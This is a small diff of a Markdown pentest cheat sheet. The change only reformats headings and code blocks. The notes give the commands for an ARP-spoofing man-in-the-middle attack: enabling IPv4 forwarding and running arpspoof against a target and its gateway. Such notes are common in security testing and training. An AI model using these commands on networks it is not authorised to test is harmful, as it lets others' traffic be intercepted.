@@ -1,8 +1,10 @@
 ### Forward IPV4 traffic
 ```
 echo 1 > /proc/sys/net/ipv4/ip_forward
+```
  
-# send fake ARP packages
+### Send fake ARP packages
+```
 arpspoof -i <interface> -t <rhost> -r <gatewayIp>
 ```
 
